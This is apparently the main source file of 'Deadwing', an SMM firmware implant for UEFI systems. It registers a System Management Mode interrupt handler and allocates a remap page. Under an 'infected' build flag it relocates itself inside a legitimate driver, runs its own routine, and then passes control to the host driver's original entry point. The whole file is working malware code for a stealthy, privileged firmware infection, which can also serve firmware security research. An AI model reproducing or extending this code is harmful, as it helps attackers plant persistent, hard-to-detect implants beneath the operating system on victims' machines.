#include <Uefi.h>

#include <Library/UefiLib.h>
#include <Library/SmmServicesTableLib.h>

#include <Protocol/LoadedImage.h>
#include <Protocol/SmmBase2.h>
#include <Protocol/SmmCpu.h>

#include <IndustryStandard/PeImage.h>

#include "Conf.h"

#ifndef DEADWING_QEMU_FIRMWARE
#include "VisualUefi.h"
#endif

#include "Globals.h"
#include "Defs.h"
#include "Smi.h"
#include "Serial.h"
#include "Utils.h"
#include "Relocations.h"

typedef EFI_STATUS(EFIAPI *__EfiEntry)(IN EFI_HANDLE, IN EFI_SYSTEM_TABLE *);
__EfiEntry Entry;


/**
 * \brief Initializes SMM context: registers SMI handler, saves SmmCpu
 * protocol
 * 
 * \return EFI_SUCCESS - Context was initialized succesfully
 * \return Other - Unable to register notifiers or allocate page(s)
 */
EFI_STATUS
EFIAPI
InitializeSmmContext(
	VOID
) {
	EFI_STATUS Status;

	// register Deadwing SMI handler and allocate remap page 
	Status = SmiRegisterHandler();
	if(!EFI_ERROR(Status)) {
		// allocate page for remaping virtual and physical addresses
		Status = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &gRemapPage);
		if(EFI_ERROR(Status)) {
			SerialPrint("[ SMM ] Unable to allocate remap page\r\n");
			return Status;
		}

		gBS->SetMem(gRemapPage, EFI_PAGE_SIZE, 0);
	} else {
		SerialPrint("[ SMM ] Unable to register SMI handler\r\n");
	}

	return Status;
}

/**
 * \brief Main routine of the Deadwing SMM driver
 * 
 * \param ImageHandle Image handle
 * \param SystemTable Pointer on EFI_SYSTEM_TABLE
 * 
 * \return EFI_SUCCESS - Driver has been initialized sucessfully
 * \return EFI_ACCESS_DENIED - Driver has been invoked under DXE environment
 * \return Other - Unable to perform any operation
 */
EFI_STATUS
EFIAPI
DeadwingMain(
	IN EFI_HANDLE        ImageHandle,
	IN EFI_SYSTEM_TABLE *SystemTable
) {
	SerialPrint("=[ Deadwing SMM ]=\r\n");
	SerialPrint("=[ By: 0x00Alchemist ]=\r\n");
	SerialPrint("=[ Thanks to: my friends and my cute kitten ]=\r\n");

	// Locate SMM base table
	EFI_SMM_BASE2_PROTOCOL *Smm2;
	EFI_STATUS Status = gBS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, NULL, (VOID **)&Smm2);
	if(EFI_ERROR(Status)) {
		SerialPrint("[ SMM ] Unable to locate SmmBase protocol\r\n");
		return Status;
	}

	// check if driver executed in SMM context
	BOOLEAN SmmSanityCheck;
	Smm2->InSmm(Smm2, &SmmSanityCheck);
	if(SmmSanityCheck) {
		SerialPrint("[ SMM ] SMM driver invoked by SMM IPL, initializing...\r\n");

		// get SMST table
		Status = Smm2->GetSmstLocation(Smm2, &gSmst2);
		if(EFI_ERROR(Status)) {
			SerialPrint("[ SMM ] Unable to get SMST\r\n");
			return Status;
		}

		// initialize main things
		Status = InitializeSmmContext();
		if(EFI_ERROR(Status))
			SerialPrint("[ SMM ] Unable to initialize Deadwing context\r\n");
		else
			SerialPrint("[ SMM ] SMM driver has been initialized\r\n");
	} else {
		// We cannot initialize some things under DXE execution
		SerialPrint("[ SMM ] SMM driver started under DXE environment\r\n");
		return EFI_ACCESS_DENIED;
	}

	return Status;
}

/**
 * \brief Unloads loaded image
 *
 * \param ImageHandle Handle of function caller
 *
 * \return EFI_ACCESS_DENIED - Because we can't
 */
EFI_STATUS
EFIAPI
UefiUnload(
	IN EFI_HANDLE ImageHandle
) {
	return EFI_ACCESS_DENIED;
}

/**
 * \brief Entry point of SMM driver.
 * 
 * This function relocates the driver to a different base address (if necessary).
 * Verbose output not expected.
 * 
 * \param ImageHandle Image Handle
 * \param SystemTable Pointer on EFI_SYSTEM_TABLE
 * 
 * \return EFI_SUCCESS - Driver was initialized
 * \return Other - An error occurred during driver initialization
 */
EFI_STATUS
EFIAPI
UefiMain(
	IN EFI_HANDLE        ImageHandle,
	IN EFI_SYSTEM_TABLE *SystemTable
) {
	EFI_STATUS Status;

	gST = SystemTable;
	gBS = gST->BootServices;
	gRT = gST->RuntimeServices;

#ifdef DEADWING_INFECTED
	Status = EFI_ABORTED;

	// get address of the Deadwing payload
	VOID *DeadwingBase = FindBaseAddress(&UefiMain);
	if(DeadwingBase != NULL) {
		// fix relocs
		if(!RelProcessRelocTable(DeadwingBase, DeadwingBase))
			return Status;

		// relocate image and call DeadwingMain routine
		VOID *NewDeadwingBase = RelProcessSelfReloc(DeadwingBase);
		if(NewDeadwingBase == NULL)
			return Status;

		Entry = (__EfiEntry)((UINT8 *)NewDeadwingBase + ((UINT8 *)DeadwingMain - (UINT8 *)NewDeadwingBase));
		Entry(ImageHandle, SystemTable);

		// get information about current image
		EFI_LOADED_IMAGE *Loaded;
		Status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&Loaded);
		if(EFI_ERROR(Status))
			return Status;
		
		// get current headers. Entry point of the infected driver stored here
		EFI_IMAGE_NT_HEADERS64 *Nt64 = GetNtHeaders(NewDeadwingBase);
		if(Nt64 == NULL)
			return EFI_ABORTED;

		// get and call original EP
		Entry = (__EfiEntry)((UINT8 *)Loaded->ImageBase + Nt64->OptionalHeader.AddressOfEntryPoint);
		Status = Entry(ImageHandle, SystemTable);
	}
#else
	// just call Deadwing main routine
	Status = DeadwingMain(ImageHandle, SystemTable);
#endif

	return Status;
}
